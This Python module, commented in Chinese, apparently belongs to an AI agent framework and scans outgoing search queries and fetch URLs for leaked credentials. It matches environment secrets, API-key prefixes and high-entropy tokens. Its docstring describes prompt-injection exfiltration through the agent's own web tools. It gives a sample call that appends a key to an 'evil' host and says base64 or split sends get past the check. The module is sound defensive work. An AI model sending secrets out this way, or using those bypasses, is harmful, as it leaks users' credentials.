"""外传检查：查询词、要读取的 URL 发出之前先扫一遍，拦住“把密钥拼进请求”这条路。

提示注入要把数据送出去，最省事的通道就是联网工具本身：``web_search("sk-...")``、``web_fetch("https://evil/?d=<密钥>")``。
这里只拦能确定是凭证的东西，三类：

1. 当前进程环境里名字像密钥的变量（与 bash 剥离环境变量同一条规则 ``_SECRET_ENV``）的值，按原文和 URL 解码后各查一次。
   像密钥的值（16 字符以上，或字母数字混排）不分大小写；字典词式的短值只在网址主机名里不分大小写
   （域名会被规范成小写，塞进子域名照样拦；别处照原样比，免得常见词误报）；
2. 常见密钥前缀：``sk-``、``ghp_`` / ``github_pat_``、``glpat-``、``AKIA``、``AIza``、``xox?-``，以及 PEM 私钥头；
3. 长随机串（只对查询词和没出现过的 URL）：32 字符以上、大小写字母和数字混杂、字符熵高。十六进制串（提交号、哈希）不算，
   它们在正常网址里太常见。

挡不住刻意编码（base64、拆成几段分次发送）。这是兜底，主防线是 ``fetch_scope`` 的完整 URL 精确匹配。
"""

from __future__ import annotations

import math
import os
import re
from collections import Counter
from typing import Mapping
from urllib.parse import unquote_plus

from ..tools.shell import _NOT_SECRET_ENV, _SECRET_ENV

_PREFIXED = re.compile(r"(?<![A-Za-z0-9])(sk-[A-Za-z0-9_-]{16,}|gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}"
                       r"|glpat-[A-Za-z0-9_-]{20,}|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|xox[abprse]-[A-Za-z0-9-]{10,})"
                       r"|-----BEGIN [A-Z ]*PRIVATE KEY-----")
_TOKENISH = re.compile(r"[A-Za-z0-9+/_=-]{32,}")
_HOST = re.compile(r"(?i)\bhttps?://([^/?#\s@]+)")
_MIN_SECRET = 8   # 太短的值（"1"、"true"）到处都是，按子串比对只会误报


def _entropy(s: str) -> float:
    n = len(s)
    return -sum(c / n * math.log2(c / n) for c in Counter(s).values())


def _random_looking(s: str) -> bool:
    if re.fullmatch(r"[0-9a-fA-F=-]+", s):
        return False
    kinds = sum(bool(re.search(p, s)) for p in (r"[a-z]", r"[A-Z]", r"[0-9]"))
    return kinds == 3 and _entropy(s) >= 4.5


def _keylike(v: str) -> bool:
    return len(v) >= 16 or (any(c.isdigit() for c in v) and any(c.isalpha() for c in v))


def secret_values(env: Mapping[str, str] | None = None) -> list[str]:
    env = os.environ if env is None else env
    return [v for k, v in env.items()
            if _SECRET_ENV.search(k) and not _NOT_SECRET_ENV.fullmatch(k) and len(v) >= _MIN_SECRET]


def leaked(text: str, *, env: Mapping[str, str] | None = None, heuristics: bool = True) -> str | None:
    """返回命中的原因（不含命中内容本身），没命中返回 None。"""
    variants = {text, unquote_plus(text)}
    folded = {t.casefold() for t in variants}
    hosts = {m.casefold() for t in variants for m in _HOST.findall(t)}
    for v in secret_values(env):
        if any(v in t for t in variants):
            return "包含当前环境里某个密钥变量的值"
        # 不分大小写：像密钥的值（够长，或字母数字混排）在哪都比，改成小写绕不过去；
        # 字典词式的短值（DB_PASSWORD=Postgres）只在主机名里比——主机名会被规范成小写，别处比会让“postgres 调优”误报
        pool = folded if _keylike(v) else hosts
        if any(v.casefold() in t for t in pool):
            return "包含当前环境里某个密钥变量的值"
    for t in variants:
        if _PREFIXED.search(t):
            return "包含形似 API 密钥的字符串"
    if heuristics:
        for t in variants:
            if any(_random_looking(m) for m in _TOKENISH.findall(t)):
                return "包含形似令牌的长随机串"
    return None


__all__ = ["leaked", "secret_values"]
